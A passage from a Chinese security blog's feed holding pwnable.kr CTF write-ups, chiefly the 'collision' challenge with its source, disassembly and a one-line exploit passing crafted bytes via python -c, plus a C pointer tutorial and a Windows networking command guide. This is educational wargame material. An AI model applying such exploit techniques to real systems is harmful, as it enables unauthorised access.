fd@pwnable.kr -p2222</span><br><span class="line">fd@pwnable.kr&apos;s password:guest</span><br><span class="line"> ____  __    __  ____    ____  ____   _        ___      __  _  ____</span><br><span class="line">|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \</span><br><span class="line">|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  &apos; / |  D  )</span><br><span class="line">|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    /</span><br><span class="line">|  |  |  `  &apos;  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \</span><br><span class="line">|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \</span><br><span class="line">|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|</span><br><span class="line"></span><br><span class="line">fd@pwnable:~$ ls -l</span><br><span class="line">total 16</span><br><span class="line">-r-sr-x--- 1 fd_pwn fd   7322 Jun 11  2014 fd</span><br><span class="line">-rw-r--r-- 1 root   root  418 Jun 11  2014 fd.c</span><br><span class="line">-r--r----- 1 fd_pwn root   50 Jun 11  2014 flag</span><br><span class="line"></span><br><span class="line">fd@pwnable:~$ ./fd 4660</span><br><span class="line">LETMEWIN</span><br><span class="line">good job :)</span><br><span class="line">mommy! I think I know what a file descriptor is!!</span><br></pre></td></tr></table></figure><h3 id="0x03-参考文章"><a href="#0x03-参考文章" class="headerlink" title="0x03 参考文章"></a><font color="navy"><code>0x03 参考文章</code></font></h3><blockquote><ol><li><a href="https://www.jianshu.com/p/096974c1e5c4" target="_blank" rel="noopener">pwnable第一关fd</a></li><li><a href="https://blog.csdn.net/Eastmount/article/details/20413773" target="_blank" rel="noopener">[C/C++基础知识] main函数的参数argc和argv</a></li><li><a href="https://blog.csdn.net/cywosp/article/details/38965239" target="_blank" rel="noopener">每天进步一点点——Linux中的文件描述符与打开文件之间的关系</a></li></ol></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x00-相关知识&quot;&gt;&lt;a href=&quot;#0x00-相关知识&quot; class=&quot;headerlink&quot; title=&quot;0x00 相关知识&quot;&gt;&lt;/a&gt;&lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x00 相关知识&lt;/code&gt;&lt;/font&gt;&lt;/h3&gt;&lt;h4 id
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
      <category term="pwnable.kr" scheme="https://muzibing.github.io/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>Pwnable.kr的奇幻之旅（二）[collision]</title>
    <link href="https://muzibing.github.io/2020/04/23/2020.04.24%EF%BC%88109%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/04/23/2020.04.24（109）/</id>
    <published>2020-04-22T16:00:00.000Z</published>
    <updated>2020-04-29T08:49:53.044Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-相关知识"><a href="#0x00-相关知识" class="headerlink" title="0x00 相关知识"></a><font color="navy"><code>0x00 相关知识</code></font></h3><h4 id="1-PwnTools工具的使用"><a href="#1-PwnTools工具的使用" class="headerlink" title="1.PwnTools工具的使用"></a><font color="blue"><code>1.PwnTools工具的使用</code></font></h4><blockquote><p>这个知识点再单独进行总结</p></blockquote><h4 id="2-字符串强制转换为数字"><a href="#2-字符串强制转换为数字" class="headerlink" title="2.字符串强制转换为数字"></a><font color="blue"><code>2.字符串强制转换为数字</code></font></h4><blockquote><p>可以从下面题目中的例子发现</p></blockquote><h4 id="3-python-c的功能"><a href="#3-python-c的功能" class="headerlink" title="3.python -c的功能"></a><font color="blue"><code>3.python -c的功能</code></font></h4><blockquote><p>Specify the command to execute. This terminates the option list (following options are passed as arguments to the command).</p><p>指定要执行的命令。这将终止选项列表 (紧跟的选项作为参数传递给命令)</p></blockquote><h4 id="4-shell命令中-和-的作用"><a href="#4-shell命令中-和-的作用" class="headerlink" title="4.shell命令中``和$的作用"></a><font color="blue"><code>4.shell命令中``和$的作用</code></font></h4><blockquote><p>反引号在Linux shell命令行中有特殊的含义：反引号间的内容，会被shell先执行。其输出被放入主命令后，主命令再被执行。比如：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@euca-10-254-99-183 ~]# cd /usr/src/kernels/`uname -r`</span><br><span class="line">[root@euca-10-254-99-183 4.12.11-300.fc26.x86_64]#</span><br></pre></td></tr></table></figure><blockquote><p>或者是</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@euca-10-254-99-183 ~]# cd /usr/src/kernels/$(uname -r)</span><br><span class="line">[root@euca-10-254-99-183 4.12.11-300.fc26.x86_64]#</span><br></pre></td></tr></table></figure><h3 id="0x01-题目分析"><a href="#0x01-题目分析" class="headerlink" title="0x01 题目分析"></a><font color="navy"><code>0x01 题目分析</code></font></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh col@pwnable.kr -p2222</span><br></pre></td></tr></table></figure><p>连上服务器之后，查看一下有什么文件以及相关的权限：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">total 16</span><br><span class="line">-r-sr-x--- 1 col_pwn col     7341 Jun 11  2014 col</span><br><span class="line">-rw-r--r-- 1 root    root     555 Jun 12  2014 col.c</span><br><span class="line">-r--r----- 1 col_pwn col_pwn   52 Jun 11  2014 flag</span><br></pre></td></tr></table></figure><p>和上个题目一样，我们接着看看<code>col.c</code>文件中的源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">                res += ip[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"usage : %s [passcode]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"passcode length should be 20 bytes\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"wrong passcode.\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><font color="navy">**下面就来分析一下源码**：</font><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"usage : %s [passcode]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>和第一题一样，要求我们输入的参数不能小于1个（因为还有1个是程序名自身）</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"passcode length should be 20 bytes\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>我们输入的第一个参数的长度要为20字节，否则就会终止程序</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"wrong passcode.\n"</span>);</span><br></pre></td></tr></table></figure><blockquote><p>这是最关键的一段代码，要求<code>hashcode == check_password( argv[1] )</code>，也就是说我们输入的参数在经过函数check_password()之后的结果要于hashcode同值同类型，下面是hashcode和check_password()函数的源码：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">                res += ip[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>从第2行和第3行来看，可以看出来将我们输入的参数（string）强制转化为了int类型，下面我们看一下这里的汇编代码：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">08048494 &lt;check_password&gt;:</span><br><span class="line"> 8048494:       55                      push   %ebp</span><br><span class="line"> 8048495:       89 e5                   mov    %esp,%ebp</span><br><span class="line"> 8048497:       83 ec 10                sub    $0x10,%esp</span><br><span class="line"> 804849a:       8b 45 08                mov    0x8(%ebp),%eax</span><br><span class="line"> 804849d:       89 45 fc                mov    %eax,-0x4(%ebp)</span><br><span class="line"> 80484a0:       c7 45 f8 00 00 00 00    movl   $0x0,-0x8(%ebp)</span><br><span class="line"> 80484a7:       c7 45 f4 00 00 00 00    movl   $0x0,-0xc(%ebp)</span><br><span class="line"> 80484ae:       eb 12                   jmp    80484c2 &lt;check_password+0x2e&gt;</span><br><span class="line"> 80484b0:       8b 45 f4                mov    -0xc(%ebp),%eax</span><br><span class="line"> 80484b3:       c1 e0 02                shl    $0x2,%eax</span><br><span class="line"> 80484b6:       03 45 fc                add    -0x4(%ebp),%eax</span><br><span class="line"> 80484b9:       8b 00                   mov    (%eax),%eax</span><br><span class="line"> 80484bb:       01 45 f8                add    %eax,-0x8(%ebp)</span><br><span class="line"> 80484be:       83 45 f4 01             addl   $0x1,-0xc(%ebp)</span><br><span class="line"> 80484c2:       83 7d f4 04             cmpl   $0x4,-0xc(%ebp)</span><br><span class="line"> 80484c6:       7e e8                   jle    80484b0 &lt;check_password+0x1c&gt;</span><br><span class="line"> 80484c8:       8b 45 f8                mov    -0x8(%ebp),%eax</span><br><span class="line"> 80484cb:       c9                      leave</span><br><span class="line"> 80484cc:       c3                      ret</span><br></pre></td></tr></table></figure><blockquote><p>将上图的汇编代码用图示表示如下：</p></blockquote><p><img src="/images/109-1.gif" alt></p><p><code>附：我已经将PPT上传到百度云，有兴趣的可以下载</code><a href="https://pan.baidu.com/s/1neQS53_AsB4ThzozRD5Xqw" target="_blank" rel="noopener">下载链接（提取码: ra6q）</a></p><blockquote><p>可以从汇编代码中可以看出，check_password()函数将我们输入的长度为20的字符串，按照每4个唯一单位，分为5次相加，所得到的结果要等于<code>0x21DD09EC</code></p></blockquote><h3 id="0x02-解题步骤"><a href="#0x02-解题步骤" class="headerlink" title="0x02 解题步骤"></a><font color="navy"><code>0x02 解题步骤</code></font></h3><blockquote><p>该题最重要的是如何将我们输入的字符串按照每四个的长度相加等于<code>0x21DD09EC</code>，十进制为<code>568134124</code></p></blockquote><p><code>思路：</code></p><ol><li>将<code>568134124</code>/5，得到<code>113626824.8</code>，明显不能整除</li><li>求的余数为：568134124 - 113626824*4 = <code>113626828</code></li><li>所以我们要输入的应该为<code>113626824113626824113626824113626824113626828</code>，其中：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(<span class="number">113626824</span>)</span><br><span class="line"><span class="string">'0x6c5cec8'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(<span class="number">113626828</span>)</span><br><span class="line"><span class="string">'0x6c5cecc'</span></span><br></pre></td></tr></table></figure><ol><li>因为是小段口输入，所以在构造exploit时，要对字符串进行逆转，<code>\xcc\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06</code></li><li>构造的exploit如下：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./col `python -c &apos;print &quot;\xcc\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06&quot;&apos;`</span><br><span class="line"></span><br><span class="line">或者是</span><br><span class="line"></span><br><span class="line"> ./col $(python -c &apos;print &quot;\xcc\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06&quot;&apos;)</span><br></pre></td></tr></table></figure><h3 id="0x03-参考文章"><a href="#0x03-参考文章" class="headerlink" title="0x03 参考文章"></a><font color="navy"><code>0x03 参考文章</code></font></h3><ol><li><a href="https://0xrick.github.io/pwn/collision/" target="_blank" rel="noopener">pwnable.kr - collision</a></li><li><a href="https://blog.csdn.net/phoenix339/article/details/90405610" target="_blank" rel="noopener">python -c 执行单行命令/脚本，有点意思</a></li><li><a href="https://blog.csdn.net/chengyq116/article/details/87894641" target="_blank" rel="noopener">Python -c / -m 执行命令</a></li><li><a href="https://www.jianshu.com/p/ed41f2e48464" target="_blank" rel="noopener">Shell命令中的反引号（`）</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x00-相关知识&quot;&gt;&lt;a href=&quot;#0x00-相关知识&quot; class=&quot;headerlink&quot; title=&quot;0x00 相关知识&quot;&gt;&lt;/a&gt;&lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x00 相关知识&lt;/code&gt;&lt;/font&gt;&lt;/h3&gt;&lt;h4 id
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
      <category term="pwnable.kr" scheme="https://muzibing.github.io/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>详解pointer（指针）中的“*”（取值）和“&amp;”（取地址）</title>
    <link href="https://muzibing.github.io/2020/03/30/2020.03.30%EF%BC%88107%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/03/30/2020.03.30（107）/</id>
    <published>2020-03-29T16:00:00.000Z</published>
    <updated>2020-03-30T14:36:18.116Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/107-1.png" alt></p><p>&nbsp;&nbsp;&nbsp;&nbsp;今天要好好的解析以下C/C++中的“*”和“&amp;”的区别，示例代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> b = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">int</span>* a = &amp;b;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"a:%d\n"</span>,a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"*a:%d\n"</span>,*a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"&amp;a:%d\n"</span>,&amp;a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"*&amp;a:%d\n"</span>,*&amp;a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"**&amp;a:%d\n"</span>,**&amp;a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"&amp;b:%d\n"</span>,&amp;b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"*&amp;b:%d\n"</span>,*&amp;b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>如果以前看到这么多“*”和“\&amp;”符号</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;/images/107-1.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;今天要好好的解析以下C/C++中的“*”和“&amp;amp;”的区别，示例代码如下：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>Windows常用的网络命令（web）</title>
    <link href="https://muzibing.github.io/2020/03/26/2020.03.26%EF%BC%88106%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/03/26/2020.03.26（106）/</id>
    <published>2020-03-25T16:00:00.000Z</published>
    <updated>2020-05-06T13:44:42.757Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-ipconfig"><a href="#0x00-ipconfig" class="headerlink" title="0x00 ipconfig"></a><font color="brown">0x00 ipconfig</font></h3><p><code>作用</code>：可以使用 ipconfig 命令获得主机配置信息，包括 IP 地址、子网掩码和默认网关</p><p>IPConfig实用程序和它的等价图形用户界面——Windows 95/98中的WinIPCfg可用于显示当前的TCP/IP配置的设置值。这些信息一般用来检验人工配置的TCP/IP设置是否正确。但是，如果我们的计算机和所在的局域网使用了动态主机配置协议（DHCP），这个程序所显示的信息也许更加实用。</p><p><code>IPConfig最常用的选项：</code></p><p>▧  <code>ipconfig</code>：当使用IPConfig时不带任何参数选项，那么它为每个已经配置了的接口显示IP地址、子网掩码和缺省网关值。</p><p>▧  <code>ipconfig /all</code>：当使用all选项时，IPConfig能为DNS和WINS服务器显示它已配置且所要使用的附加信息（如IP地址等），并且显示内置于本地网卡中的物理地址（MAC）。如果IP地址是从DHCP服务器租用的，IPConfig将显示DHCP服务器的IP地址和租用地址预计失效的日期。</p><p>▧  <code>ipconfig /release</code>和<code>ipconfig /renew</code>：这是两个附加选项，只能在向DHCP服务器租用其IP地址的计算机上起作用。如果我们输入ipconfig /release，那么所有接口的租用IP地址便重新交付给DHCP服务器（归还IP地址）。如果我们输入ipconfig /renew，那么本地计算机便设法与DHCP服务器取得联系，并租用一个IP地址。请注意，大多数情况下网卡将被重新赋予和以前所赋予的相同的IP地址。</p><h3 id="0x01-ping"><a href="#0x01-ping" class="headerlink" title="0x01 ping"></a><font color="brown">0x01 ping</font></h3><p>Ping是个使用频率极高的实用程序，<code>用于确定本地主机是否能与另一台主机交换（发送与接收）数据报</code>。根据返回的信息，我们就可以推断TCP/IP参数是否设置得正确以及运行是否正常。需要注意的是：成功地与另一台主机进行一次或两次数据报交换并不表示TCP/IP配置就是正确的，我们必须执行大量的本地主机与远程主机的数据报交换，才能确信TCP/IP的正确性。</p><p>如果Ping运行正确，我们大体上就可以排除网络访问层、网卡、MODEM的输入输出线路、电缆和路由器等存在的故障，从而减小了问题的范围。但由于可以自定义所发数据报的大小及无休止的高速发送，Ping也被某些别有用心的人作为DDOS（拒绝服务攻击）的工具，例如许多大型的网站就是被黑客利用数百台可以高速接入互联网的电脑连续发送大量Ping数据报而瘫痪的。</p><p>按照缺省设置，Windows上运行的Ping命令发送4个ICMP回送请求，每个32字节数据，如果一切正常，我们应能得到4个回送应答。 Ping能够以毫秒为单位显示发送回送请求到返回回送应答之间的时间量。如果应答时间短，表示数据报不必通过太多的路由器或网络连接速度比较快。Ping还能显示TTL（Time To Live存在时间）值，我们可以通过TTL值推算一下数据包已经通过了多少个路由器：源地点TTL起始值（就是比返回TTL略大的一个2的乘方数）-返回时TTL值。例如，返回TTL值为119，那么可以推算数据报离开源地址的TTL起始值为128，而源地点到目标地点要通过9个路由器网段（128-119）；如果返回TTL值为246，TTL起始值就是256，源地点到目标地点要通过9个路由器网段。</p><font color="navy">**1、通过Ping检测网络故障的典型次序**</font><p>正常情况下，当我们使用Ping命令来查找问题所在或检验网络运行情况时，我们需要使用许多Ping命令，如果所有都运行正确，我们就可以相信基本的连通性和配置参数没有问题；如果某些Ping命令出现运行故障，它也可以指明到何处去查找问题。下面就给出一个典型的检测次序及对应的可能故障：</p><p>▧ <code>ping 127.0.0.1</code></p><blockquote><p>这个Ping命令被送到本地计算机的IP软件，该命令永不退出该计算机。如果没有做到这一点，就表示TCP/IP的安装或运行存在某些最基本的问题。</p></blockquote><p>▧ <code>ping 本机IP</code></p><blockquote><p>这个命令被送到我们计算机所配置的IP地址，我们的计算机始终都应该对该Ping命令作出应答，如果没有，则表示本地配置或安装存在问题。出现此问题时，局域网用户请断开网络电缆，然后重新发送该命令。如果网线断开后本命令正确，则表示另一台计算机可能配置了相同的IP地址。</p></blockquote><p>▧ <code>ping 局域网内其他IP</code></p><blockquote><p>这个命令应该离开我们的计算机，经过网卡及网络电缆到达其他计算机，再返回。收到回送应答表明本地网络中的网卡和载体运行正确。但如果收到0个回送应答，那么表示子网掩码（进行子网分割时，将IP地址的网络部分与主机部分分开的代码）不正确或网卡配置错误或电缆系统有问题。</p></blockquote><p>▧ <code>ping 网关IP</code></p><blockquote><p>这个命令如果应答正确，表示局域网中的网关路由器正在运行并能够作出应答。</p></blockquote><p>▧ <code>ping 远程IP</code></p><blockquote><p>如果收到4个应答，表示成功的使用了缺省网关。对于拨号上网用户则表示能够成功的访问Internet（但不排除ISP的DNS会有问题）</p></blockquote><p>▧ <code>ping localhost</code></p><blockquote><p>localhost是个作系统的网络保留名，它是127.0.0.1的别名，每台计算机都应该能够将该名字转换成该地址。如果没有做到这一带内，则表示主机文件（/Windows/host）中存在问题。</p></blockquote><p>▧ <code>ping www.xxx.com（如www.yesky.com 天极网）</code></p><blockquote><p>对这个域名执行Ping www.xxx.com 地址，通常是通过DNS 服务器 如果这里出现故障，则表示DNS服务器的IP地址配置不正确或DNS服务器有故障（对于拨号上网用户，某些ISP已经不需要设置DNS服务器了）。顺便说一句：我们也可以利用该命令实现域名对IP地址的转换功能。</p><p>如果上面所列出的所有Ping命令都能正常运行，那么我们对自己的计算机进行本地和远程通信的功能基本上就可以放心了。但是，这些命令的成功并不表示我们所有的网络配置都没有问题，例如，某些子网掩码错误就可能无法用这些方法检测到。</p></blockquote><font color="navy">**2、Ping命令的常用参数选项**</font><p>(您可以使用 Ping 命令的不同选项来指定要使用的数据包大小、要发送多少数据包、是否记录用过的路由、要使用的生存时间 (TTL) 值以及是否设置“不分段”标志。可以键入 ping -? 查看这些选项。)</p><p>▧ <code>ping IP –t</code></p><blockquote><p>连续对IP地址执行Ping命令，直到被用户以Ctrl+C中断。</p></blockquote><p>▧ <code>ping IP -l 300</code></p><blockquote><p>指定Ping命令中的数据长度为300字节，而不是缺省的32字节。</p></blockquote><p>▧ <code>ping IP –n</code></p><blockquote><p>执行特定次数的Ping命令。</p></blockquote><p>下例说明如何向 IP 地址 172.16.48.10 发送两个 Ping，每个都是 1,450 字节：<code>C:\&gt;ping -n 2 -l 1450 172.16.48.10</code></p><p>默认情况下，在显示“请求超时”之前，Ping 等待 1,000 毫秒（1 秒）的时间让每个响应返回。如果通过 Ping 探测的远程系统经过长时间延迟的链路，如卫星链路，则响应可能会花更长的时间才能返回。可以使用 -w （等待）选项指定更长时间的超时。</p><h3 id="0x02-arp"><a href="#0x02-arp" class="headerlink" title="0x02 arp"></a><font color="brown">0x02 arp</font></h3><p><code>使用 Arp 解决硬件地址问题</code></p><p>ARP是一个重要的TCP/IP协议，并且用于确定对应IP地址的网卡物理地址。实用arp命令，我们能够查看本地计算机或另一台计算机的ARP高速缓存中的当前内容。此外，使用arp命令，也可以用人工方式输入静态的网卡物理/IP地址对，我们可能会使用这种方式为缺省网关和本地服务器等常用主机进行这项作，有助于减少网络上的信息量。</p><p>按照缺省设置，ARP高速缓存中的项目是动态的，每当发送一个指定地点的数据报且高速缓存中不存在当前项目时，ARP便会自动添加该项目。一旦高速缓存的项目被输入，它们就已经开始走向失效状态。例如，在Windows NT/2000网络中，如果输入项目后不进一步使用，物理/IP地址对就会在2至10分钟内失效。因此，如果ARP高速缓存中项目很少或根本没有时，请不要奇怪，通过另一台计算机或路由器的ping命令即可添加。所以，需要通过arp命令查看高速缓存中的内容时，请最好先ping 此台计算机（不能是本机发送ping命令）。</p><font color="navy">**ARP常用命令选项：**</font><p>▧ <code>arp -a或arp –g</code>：用于查看高速缓存中的所有项目。-a和-g参数的结果是一样的，多年来-g一直是UNIX平台上用来显示ARP高速缓存中所有项目的选项，而Windows用的是arp -a（-a可被视为all，即全部的意思），但它也可以接受比较传统的-g选项。</p><p>▧ <code>arp -a IP</code>：如果我们有多个网卡，那么使用arp -a加上接口的IP地址，就可以只显示与该接口相关的ARP缓存项目。</p><p>▧ <code>arp -s IP 物理地址</code>：我们可以向ARP高速缓存中人工输入一个静态项目。该项目在计算机引导过程中将保持有效状态，或者在出现错误时，人工配置的物理地址将自动更新该项目。</p><p>▧ <code>arp -d IP</code>：使用本命令能够人工删除一个静态项目。</p><p>例如我们在命令提示符下，键入 Arp –a；如果我们使用过 Ping 命令测试并验证从这台计算机到 IP 地址为 10.0.0.99 的主机的连通性，则 ARP 缓存显示以下项： </p><p><code>Interface:10.0.0.1 on interface 0x1</code></p><div class="table-container"><table><thead><tr><th style="text-align:center">Internet Address</th><th style="text-align:center">Physical Address</th><th style="text-align:center">Type</th></tr></thead><tbody><tr><td style="text-align:center">10.0.0.99</td><td 